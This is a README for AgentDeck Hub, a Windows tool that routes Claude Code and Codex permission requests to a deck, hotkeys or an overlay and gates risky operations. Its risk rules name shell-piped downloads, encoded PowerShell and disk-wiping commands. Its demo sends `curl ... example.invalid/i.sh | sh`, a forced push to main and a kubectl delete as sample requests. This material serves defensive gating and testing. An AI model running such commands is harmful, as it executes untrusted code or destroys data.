# AgentDeck Hub v1.4

Hub answers Claude Code and Codex `PermissionRequest` hooks directly. Approval
does not send Enter or Esc to a terminal. Hub reuses the existing deck window
focus logic and LCD protocol; firmware changes are unnecessary.
No additional dependencies are required beyond the project's installed packages.

## Start and configure

From the project root, using `D:/conda/miniconda3/python.exe` as `python`:

```text
python pc/hub.py --backend none
python pc/hub.py --backend usb -v
python pc/hub.py doctor
python pc/hub_install.py install --dry-run
python pc/hub_install.py install
python pc/hub_install.py uninstall --dry-run
python pc/hub_install.py uninstall
```

The install/uninstall commands above are for the user to execute. Development
tests use temporary homes and never install into the real Claude/Codex settings.
Use `install cc` or `install cx` to select one agent. Existing hooks, including
`agent_lcd.py`, are retained. Existing configuration is backed up as
`*.bak-agentdeck-<timestamp>` before replacement. Repeating an unchanged install
creates neither duplicate entries nor extra backups.

## PreToolUse gate (v1.4)

The optional gate also runs before tools when auto mode skips
`PermissionRequest`. Preview and install it explicitly with:

```text
python pc/hub_install.py install --gate --dry-run
python pc/hub_install.py install --gate
python pc/hub.py --overlay --no-lcd
```

These installation commands are for the user; tests use temporary homes. The
gate is a separate `PreToolUse` relay (`--agent cc|cx --gate`) alongside ordinary
status telemetry. Claude uses matcher `Bash|Edit|Write|mcp__.*`; both agents use
a 120-second hook timeout. Reinstall is idempotent and retains an already
installed gate even without `--gate`; `uninstall` removes both relay kinds.

Gate events POST to `/event?agent=cc&gate=1` (or `cx`). Default mode intercepts
high and critical risk; low returns `{}` immediately without waiting or LCD
access. Intercepted requests show `GATE` on the LCD and overlay. High and
critical require two distinct approve presses within 1.5 seconds against the
same displayed request. Passing the gate returns **only `{}`**, never `allow`;
the agent still applies its own permission rules. Critical gates are actionable,
while critical `PermissionRequest` records still require native terminal approval.

**Hub unavailable (fail-closed only for risky operations).** If the relay cannot
get a valid gate answer (hub stopped, missing token, connection error, bad
response), it does not block everything. It classifies the tool call locally with
the same rules as the hub (`pc/hub_risk.py`, shared by `hub.py` and
`hub_relay.py`; `hub.classify` still works), reading `production_hosts`,
`protected_branches` and `mcp_write_tools` from `~/.agentdeck/config.json` when
readable and using the defaults otherwise (`main`, `master`, `release/*`, no
production hosts):

- low risk: prints nothing, exit 0, the agent continues normally;
- high or critical: prints the gate deny JSON below, with a reason saying the hub
  is unavailable;
- unclassifiable input (malformed JSON, non-`PreToolUse` event, missing
  `tool_name`): prints nothing, does not block, and appends a line to
  `~/.agentdeck/relay.log`.

The failure path imports only the standard library (no serial, tkinter or usb);
it takes about 150 ms per call on the development machine, of which about 80 ms
is Python startup.

Deny, approval timeout (110 seconds by default), Stop/Interrupt/SessionEnd, or
Hub shutdown returns:

```json
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"Blocked by AgentDeck gate: <reason>"}}
```

Gate relay errors, missing Hub/token, and unexpected responses also deny.
Ordinary relay errors retain the silent native fallback. Gate read timeout is
`approve-timeout + 5` seconds. A successful gate records the canonical SHA-256
of the complete tool input, keyed by full agent/session identity, for 30 seconds.
A later matching permission request shows `已在闸门确认` in the overlay and
`Gate confirmed` on the character LCD, with `gate_confirmed: true` in `/state`.
It still waits for an explicit approve press; high risk needs one additional
press in this case. Critical permission requests retain native confirmation.
Repeated gate events always require a new gate decision. Every intercepted
gate decision is audited with `source: "gate"`.

Hub reads `%USERPROFILE%/.agentdeck/config.json` if present; `--home` relocates
it with the token/audit, and `--config FILE` chooses an explicit file. Example:

```json
{
  "gate_mode": "high",
  "production_hosts": ["prod", "*.production.example.com"],
  "protected_branches": ["main", "master", "release/*"],
  "mcp_write_tools": ["mcp__database__write", "mcp__deploy__*"]
}
```

`gate_mode` is `high` (default), `low` (also intercept low-classified requests),
or `off`; `--gate-mode` overrides the file. Host, protected-branch, and MCP tool
lists accept shell-style patterns. Configure production SSH names/aliases
explicitly; SSH config files and runtime Git upstreams are not resolved.
No MCP tools are listed by default. The current three-level classifier groups
L0/L1 together as `low`, so low mode gates both. Defaults include protected or
forced Git pushes (including forced/wildcard refspecs and all/mirror pushes),
reset/clean/deletion rules, PR merges, kubectl apply/delete/exec, terraform
apply/destroy, helm upgrade, SQL writes and common migration commands, and
writes to `.env`, `.ssh`, private key/certificate files or credential JSON.
Deployment commands are intercepted regardless of context; classification uses
the existing conservative regex rules rather than resolving cluster state.

Hub defaults to HTTP input only. USB mode reuses `deck_usb.USBInput` and requires
the existing WinUSB interface 0 setup; it does not change drivers or keymaps.
Run one AgentDeck keyboard reader at a time: use Hub's USB mode in place of
`deck.py run` / `daemon.py --deck` when testing Hub controls.

## 没有 AgentDeck 硬件怎么用

Windows 用户可以通过全局热键或鼠标使用 Hub，无需安装驱动或更换 WinUSB。
以下命令在项目根目录运行，`python` 指 `D:/conda/miniconda3/python.exe`；
没有 LCD 时加 `--no-lcd`：

```text
python pc/hub.py --backend hotkey --overlay --no-lcd
python pc/hub.py --overlay --no-lcd
python pc/hub.py --backend hotkey --no-lcd
python pc/hub.py --backend usb,hotkey --overlay
```

VIA/QMK 键盘或普通宏键盘：在键盘配置工具中把按键改成 F13–F24，
需要模板时再设置 Ctrl+F13–F16。Stream Deck：添加“系统 → 热键”动作，
发送相同的 F13–F24 或 Ctrl 组合。不需要键盘也可以只开浮窗，用鼠标
选择槽位、点击 ✓ 批准或 ✗ 拒绝。会话仍来自已有的 Claude/Codex Hub hooks；
这些命令只启动 Hub，不会安装 hooks。安装方式见上文，由用户执行。

| 热键 | 默认动作 |
| --- | --- |
| F13–F18 | 选择固定槽位 1–6 |
| F19 / F20 | 批准 / 拒绝当前显示的请求 |
| F21 | 按一下开始语音，再按一下停止（`voice_down` / `voice_up`） |
| F22 | 截图并粘贴路径 |
| F23 / F24 | 下一个 / 上一个会话 |
| Ctrl+F20 | 中断 |
| Ctrl+F13 | `prompt continue`，继续 |
| Ctrl+F14 | `prompt tests`，跑测试 |
| Ctrl+F15 | `prompt summary`，总结进度 |
| Ctrl+F16 | `prompt commit`，提交 |

热键映射位于 `hub_keys.json` 的顶层 `hotkey` 对象，与 USB `bindings` 和
`v2_emulation` 独立；`--keys FILE` 可换文件，`--profile` 只选择 USB 布局。
键名支持 F13–F24 及 Ctrl、Shift、Alt 组合，例如 `Shift+F13`、`Alt+F24`、
`Ctrl+Shift+F14`。F21 的 `voice_toggle` 在发送前检查真实语音状态，
因此 60 秒超时结束后，下次按键会重新开始。热键按下触发，持续按住不重复。
若某个组合已被占用，只记录该键的一条警告，其余组合继续工作。

浮窗宽约 360 px，默认位于右下角，始终置顶，可拖动标题栏；× 退出 Hub。
每 300 ms 从 Hub 的线程安全状态接口刷新 6 个槽位：RUN 绿、ASK 琥珀、
DONE 蓝、ERR 红、IDLE 灰。待批请求显示最多 80 字的命令摘要和风险档；
high 用红色提示，首次 ✓ 提示再按一次，仍需在 1.5 秒内确认。
critical 显示 `LOCKED: use terminal`，禁用决定按钮，使用终端原生确认。
鼠标按钮和热键使用与 HTTP `/action` 相同的状态机与风险检查；
按钮绑定画面中的请求 ID，画面过期时拒绝操作，不会改批后来的请求。
浮窗使用 Windows `WS_EX_NOACTIVATE` 并在按钮操作时保护原窗口焦点；
选择槽位会按现有逻辑主动切到对应会话窗口。

热键通过标准库 ctypes 调用
[RegisterHotKey](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey)，
独立消息线程在退出时注销所有成功注册的组合。浮窗使用标准库 tkinter 和
[Windows 扩展窗口样式](https://learn.microsoft.com/en-us/windows/win32/winmsg/extended-window-styles)。
无需新增依赖。离线验证使用替身，不实际注册热键或弹窗；Windows 真机的
按键、前台焦点和显示效果由主会话验证。

The address is always `127.0.0.1`. `--port` changes the default port 47800.
`--approve-timeout` changes the default 110-second permission wait. Use the same
options with `hub_install.py install` (or `hub_relay.py` for manual hook setup).
Installed permission hooks have a 120-second timeout, so keep the hub wait plus
the relay's five-second margin below that limit. Codex receives only supported
events; Claude additionally receives `Notification` and `PostToolUseFailure`.

On first startup Hub creates `%USERPROFILE%/.agentdeck/token`; relay reads this
file without creating it. Requests other than `GET /health` require the exact
`X-AgentDeck-Token` header. A missing hub/token, transport error, or timeout
causes relay to print nothing and exit 0, preserving the native approval flow.
Relay uses a 0.5-second connect timeout and permission read timeout of
`approve-timeout + 5` seconds (ordinary events: five seconds).

## HTTP

| Method and route | Behavior |
| --- | --- |
| `GET /health` | Public liveness check, returning `{"ok":true}`. |
| `POST /event?agent=cc` / `?agent=cx` | Accepts a hook JSON object; ordinary events return `{}` immediately, while permission requests wait for a decision or timeout. `&gate=1` enables the PreToolUse gate described above. |
| `GET /state` | Returns sessions, pending requests, selected slot, and `displayed_request_id`. |
| `GET /audit?limit=50` | Returns the most recent audit records, oldest first (limit 1..1000; token required). |
| `POST /action` | Runs the same action path used by the USB keyboard. |

Permission input example:

```json
{
  "session_id": "12345678-abcd-1234-abcd-123456789abc",
  "cwd": "D:/work/my-project",
  "hook_event_name": "PermissionRequest",
  "tool_name": "Bash",
  "tool_input": {"command": "python -m unittest"}
}
```

Action examples:

```json
{"action": "slot 2"}
{"action": "cycle -1"}
{"action": "approve", "request_id": "<id from /state>"}
{"action": "deny"}
{"action": "interrupt"}
{"action": "voice"}
{"action": "voice_down"}
{"action": "voice_up"}
{"action": "screenshot"}
{"action": "prompt tests"}
{"action": "prompt 跑测试"}
```

`slot` also accepts `{"action":"slot","slot":2}`; `cycle` accepts a `delta`
integer; `prompt` accepts a template `name`. Unknown templates or actions are
rejected. `request_id` is optional; supplying it rejects stale decisions with
HTTP 409. Approve/deny responses always include `request_id` (null if no request
is displayed). A first high-risk approve returns `status: "confirm"`; a second
within 1.5 seconds returns `status: "allowed"`. Deny returns `status: "denied"`.
Critical requests immediately return `{}` to the hook, requiring the agent's
native terminal confirmation. Their retained records have `status: "locked"`;
approve, deny, and interrupt return `status: "locked"` without deciding or
injecting keys. Responses retain `action` and `request_id` for stale-id checks.

The permission hook response is:

```json
{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}
```

Deny uses `{"behavior":"deny","message":"Denied from AgentDeck"}`. Timeout,
session end, stop/interrupt events, and hub shutdown release pending hooks with
`{}`, allowing the agent's normal flow. Codex responses never contain
`updatedInput`, `updatedPermissions`, or `interrupt`.

## Selection, display, and actions

Sessions are keyed by the full `(agent, session_id)` pair. The lowest free slot
1..6 is assigned once and released on `SessionEnd`; other slots never move.
A seventh new session receives HTTP 409 and its relay falls back to native
handling. Sessions are not silently evicted. `/state` includes each session's
cwd, project/name, state, last update, LCD key, slot and full pending details.

The first waiting request is displayed automatically. Further arrivals preserve
that request. After a decision or timeout the next request is displayed in
arrival order. Slot/cycle explicitly selects a session and its oldest pending
request, if present. Approval always targets the displayed request, even when
another window is foreground. Interrupt denies a pending request; if none is
displayed but the queue is nonempty, it denies the oldest. With no pending
request it focuses the selected session and sends one Esc.

Locked records are separate from the actionable pending queue: `/state` includes
`locked`, and each session includes `locked_requests`. With no actionable queue,
the oldest locked record is displayed; a new actionable request takes priority.
Slot/cycle can select locked sessions. Notification events and LCD heartbeats
retain the warning; the next progress event (for example PreToolUse, Stop, or
SessionEnd) clears that session's locked records. The audit history remains.

LCD keys exactly match `agent_lcd.hook_line`: `cc-` or `cx-` followed by the first
six session-id characters after removing hyphens. Hub sends existing `set`,
`end`, and `focus` commands. Every focus send holds `focus_lock` and touches
`daemon.DECK_HOLD`; a heartbeat renews the hold every 20 seconds. Missing LCD
hardware logs a warning and does not prevent decisions. The first high-risk
press shows `HOLD! press again` using the existing scrolling name field.
Critical requests show `LOCKED: use terminal` in that same scrolling field,
using the firmware's existing `wait` state. Firmware changes are unnecessary.

Window actions reuse the deck's project/title matching and reject ambiguous
matches. Screenshot captures all
screens to `%USERPROFILE%/.agentdeck/shots/<timestamp>.png` and pastes its path
without Enter. Prompt pastes a named template then sends Enter. Clipboard and
key effects verify the selected foreground window. These actions require a
session window with a title that can be uniquely matched.

Hold H to speak: `voice_down` snapshots the selected session and window handle,
focuses that window, then sends Win+H. A daemon checks the foreground handle
every 100 ms and restores the original target using the deck's activation logic
(including its AttachThreadInput fallback). Each successful recovery is counted
and logged. Changing titles or incoming permission requests do not retarget the
guard. Release H (`voice_up`) stops and joins the guard, then sends Win+H again
to stop dictation. Repeated down/up actions are idempotent. The legacy `voice`
action performs down immediately followed by up, sending both Win+H combinations.

The guard also stops at 60 seconds, on a lost window, on failed recovery, on the
target's SessionEnd, or on Hub shutdown. After recovery, release briefly displays
`VOICE: kept target` in the LCD's existing scrolling name field. Timeout, target
loss and focus failure display `VOICE: timeout`, `VOICE: target lost` and
`VOICE: focus lost`; a failed shutdown combination displays `VOICE: stop failed`.
Notices expire after five seconds and do not change the stored session name or
state. Critical approval warnings retain display priority.
If Windows rejects the closing shortcut (for example while a modifier is held),
the thread stops but Hub keeps dictation ownership and blocks other window/input
actions and approval. Release the modifier and send `voice_up` again to retry;
another `voice_down` cannot start or toggle a second interval in this state.

While voice is active, approve, slot/cycle, prompt, screenshot, legacy voice and
keyboard interrupt return HTTP 409. Explicit denial of a pending request remains
available. The guard never resolves approvals, pastes text, or sends Enter/Esc.
Its only input is Win+H; when a target disappears, it attempts that global
shortcut against the current foreground solely to stop dictation. The 100 ms
polling mechanism cannot eliminate the interval between an external focus change
and the next check; actual Windows speech-input behavior needs live validation.

`hub_prompts.json` contains four templates in both languages: `continue` / `继续`,
`tests` / `跑测试`, `summary` / `总结进度`, `commit` / `提交`. Use `--prompts FILE`
for another flat JSON mapping. `--keys FILE` selects another USB binding map.
`hub_keys.json` documents every physical key and knob; E/B/Ctrl+Z select slots
1/2/3, G approves, Ctrl+F denies, Space interrupts, H holds voice, L captures
a screenshot, and knob rotations cycle sessions.

Use `--profile v2_emulation` with `--backend usb` to select the six-slot emulation
map in `hub_keys.json`. The default bindings above remain the default profile.
See [hub_keys.md](hub_keys.md) for the physical label table, the measured Ctrl+0
alternate interrupt, and the Ctrl chords that still need hardware confirmation.

USB bindings accept either a legacy action string (key down only) or an object
with `down` and/or `up` action strings. The default voice binding is:

```json
"hid:0x0B": {"down": "voice_down", "up": "voice_up"}
```

Releases are paired with the accepted physical press, even if the device's
modifiers change or another key is now held. An aged voice release still stops
the guard. Rejected presses never arm a release action, and repeated reports do
not start another guard. If a USB disconnect loses the release, the 60-second
limit still ends the guard.

Risk has three levels: `low` allows a single press, `high` requires a double
press, and `critical` always falls back to terminal confirmation. Critical rules
run before high rules. `RISK_RULES` and `CRITICAL_RULES` in `hub.py` are regex
lists; use `--risk-rules FILE` and `--critical-rules FILE` with JSON lists to
replace their defaults independently. Sensitive-file writes add high risk for
`.env`/`.ssh` and critical risk for `.ssh/authorized_keys` (reads stay low).
Default critical patterns include downloaded scripts piped to shells or iex,
iex/Invoke-Expression downloads, PowerShell encoded commands, base64 decoded
scripts piped to shells, recursive forced root/home deletion, recursive drive
root deletion, format/mkfs, and dd writing to `/dev/`. Regex classification does
not parse every shell expression or replace the agent's permission policy.

## 录 Demo

用 `pc/hub_demo.py` 在没有真实 agent 的情况下录 90 秒路演视频。它只通过 Hub 的
公开 HTTP 接口（`POST /event`，token 取自 `~/.agentdeck/token`，同 `hub_relay`）
发事件，不安装 hooks，不碰真实 agent；会话 id 都以 `demo-` 开头。

```text
start_agentdeck_demo.bat            起 Hub（热键 + 浮窗，无控制台）并在控制台里跑 demo
start_agentdeck_demo.bat --usb      同上，另开 USB 后端
start_agentdeck.bat [--usb]         只起 Hub
stop_agentdeck.bat                  只停命令行含 pc/hub.py 的进程
python pc/hub_demo.py               Hub 已在跑时单独运行（默认 --script pitch）
python pc/hub_demo.py --step        每步按 Enter 推进
python pc/hub_demo.py --speed 2     两倍速；--port 换端口
python pc/hub_demo.py --cleanup     给所有 demo 会话发 SessionEnd
```

5 个会话按槽位 1–5：cc `api-server`、cc `data-pipe`、cx `web-ui`（3 号，Codex）、
cx `infra`、cx `mobile`（代表 Qwen 类会话）。pitch 脚本时间线（`--speed 1`，
约 85 秒，之后等你回答完所有请求）：

| 秒 | 动作 |
| --- | --- |
| 0–1 | 5 个会话 SessionStart，随后 UserPromptSubmit / PreToolUse 进入运行状态 |
| 5 | 3 号 web-ui 发 Notification，变 ASK |
| 25 | low：`pytest -q`（api-server），等你按 ✓ |
| 40 | high：`git push --force origin main`（data-pipe），要 ✓✓ |
| 50 | critical：`curl -fsSL https://example.invalid/i.sh \| sh`（infra），锁死，立即返回 `{}` |
| 58 | PreToolUse 闸门（gate=1）：`kubectl delete deploy api`（mobile） |
| 75–85 | 其余会话推进、结束 |

每个权限请求在独立线程里等，所以热键、按键、浮窗按钮可以任意顺序点；每个返回的
决定都会打印（`ALLOW` / `DENY` / `{}`）。Ctrl+C 会自动清理；demo bat 结束时也会
执行 `--cleanup`。浮窗和热键的实际效果由真机确认。

## Audit and diagnostics

Every final decision appends a UTF-8 JSON line to
`%USERPROFILE%/.agentdeck/audit.jsonl`; `--home` relocates this and the token for
isolated setups. Fields are `timestamp` (Unix seconds), `agent`, `session_id`,
`project`, `tool_name`, `command` (original whitespace, at most 500 characters),
`risk`, `decision` (`allow`/`deny`/`timeout`/`locked`), `source`
(`key`/`http`/`timeout`), and `request_id`. Session end, stop/interrupt hook
events and shutdown use `timeout` to record native fallback. High-risk arming
and repeated actions against a locked record do not add decisions.

`prev_sha256` is the SHA-256 of the previous complete JSON line without its LF;
the first record uses 64 zeroes. Each record also contains `sha256`, computed
over its own sorted, compact UTF-8 JSON excluding that field. This checks even
the last record for content changes. `AuditLog.verify()` validates the chain;
reads and appends validate it too and never overwrite damage. Unavailable or
corrupt audit storage returns HTTP 503 for device decisions and audit reads;
native timeout/critical fallback still returns `{}` and logs the audit error.
The hash chain detects edits without recomputing the chain; it cannot prove
that a whole file was replaced or its tail removed. One Hub process should own
each audit path. Existing history is scanned when reading/appending.

`python pc/hub.py doctor` performs seven read-only checks: `/health`, nonempty
token, relay entries for both agents, cc/cx events in the last ten minutes, and
`claude auth status` (five-second timeout). `/state` supplies `agents_seen`
with each agent's last event time in Unix seconds, or null before any event.
Doctor prints ✓/✗ and repair advice, including Codex `/hooks` trust and Claude
login guidance, and exits 0 only when all checks pass. It never installs hooks,
creates a token, logs in, or opens serial. `--port`/`--home` work with doctor.

## Verification

```text
python pc/test_hub.py
python pc/test_hub_gate.py
python pc/test_hub_hotkey.py
python pc/test_hub_overlay.py
python pc/test_hub_runtime.py
python pc/test_hub_demo.py
python pc/test_ui.py
python pc/test_daemon.py
python pc/test_pc.py
python pc/test_deck.py
python pc/test_deck_exclusive.py
python pc/test_deck_input.py
python pc/test_deck_keymap.py
python pc/test_deck_probe.py
python pc/test_deck_usb.py
python pc/test_focus_lock.py
python research/selftest_hub_replay.py
python pc/sim.py
```

`selftest_hub_replay.py` starts a temporary Hub process on a random loopback
port with `--home` pointing to a temporary directory, `--backend none`,
`--no-lcd`, and `--no-desktop`. It replays handwritten boot reports through
`deck_usb.ReportState` and Hub's `USBKeys` dispatcher into `POST /action`, while
`hub_relay.relay()` submits Codex permission hooks. It prints a PASS/FAIL table,
exits nonzero on failure, and shuts down the temporary process. It does not
access serial/USB, install hooks, focus real windows, or send native keys.
The output switches also work for manual isolated HTTP testing: `--no-lcd`
skips serial, LCD focus locking and hold files; `--no-desktop` disables window
focus, dictation, screenshots, clipboard and native input. Token, audit and
relay diagnostics follow `--home`.

`test_hub.py` includes the desktop, relay and installer test classes. All native
effects use substitutes; real HTTP tests bind an ephemeral loopback port, and
filesystem tests stay in temporary directories. Complete validation output is
in `hub_test_output.txt`. No real hook installation, COM4 access, firmware
upload, or native keyboard input is part of these checks. Live Claude/Codex and
physical-device end-to-end checks remain for the user's main session.
The acceptance suite also covers the new audit chain, locked native fallback,
event timestamps, and substitute doctor checks in `test_hub_doctor.py`.
The v1.2 cases exercise foreground recovery on a controlled 100 ms cycle,
release/join and exactly two Win+H combinations, timeout, target loss, focus
failure, title changes, duplicate/concurrent stops, HTTP down/up, USB release
pairing, transient LCD notices and shutdown. Clocks, windows and keyboard input
are injected substitutes throughout.

Hook schema references: [Codex official hooks](https://learn.chatgpt.com/docs/hooks),
[Claude Code official hooks](https://code.claude.com/docs/en/hooks), and
`agentdeck/research/raw-tech.md` sections 1.2/1.4.

## 虚拟设备

`pc/hub_virtual_device.py` 是 v2 硬件的软件孪生（tkinter），没有实体设备时用来录 pitch demo。
外观按 `agentdeck/concept/v2/topdown-v2.png`：银灰机身 900x420，顶部黑色条屏 640x172 分 6 区，
每区显示槽号、项目名（最多 8 字）和状态 chip（RUN 绿 / ASK 琥珀 / DONE 蓝 / ERR 红 / IDLE 灰 /
GATE 红色 2 Hz 闪烁 / LOCKED）；条屏底行显示当前请求（命令摘要最多 60 字 + 风险级别，high 红色，
critical 显示 `LOCKED: use terminal`，gate 以 `GATE` 开头）。下方 6 个键帽带 RGB 底光，颜色跟随各区状态；
底排为 ✓、✗、麦克风（按住 voice_down，松开 voice_up）、小 Ctrl（点一下开/关，下一次动作键用掉它）、
截图键；右侧滚轮：鼠标滚轮悬停其上或点上/下半区，上 = `cycle -1`，下 = `cycle +1`。按键按下时变暗 120 ms。

```text
python pc/hub_virtual_device.py [--port 47800] [--scale 1.0] [--topmost] [--home DIR]
start_agentdeck_demo.bat --virtual
```

- 点槽键发 `slot N`；Ctrl+槽 发 `prompt continue/tests/summary/commit/tests/summary`（与 `hub_keys.json`
  `v2_emulation` 一致）；Ctrl+✗ 发 `interrupt`；✓/✗ 带上当前显示请求的 `request_id`。
- 所有动作走 Hub 的 HTTP `/action`（`X-AgentDeck-Token`，读 `~/.agentdeck/token`），状态每 200 ms 轮询 `/state`。
  与 overlay 并行运行互不影响；Hub 未启动时窗口显示全 IDLE。
- 窗口无边框，复用 overlay 的 `WS_EX_NOACTIVATE` 做法，点击不抢目标应用焦点；拖空白处移动，点右上角 × 关闭。
- 绘制模型是纯函数（`build_scene(state, ui, now)` 返回绘制指令），测试见 `pc/test_hub_virtual_device.py`，无需显示器。
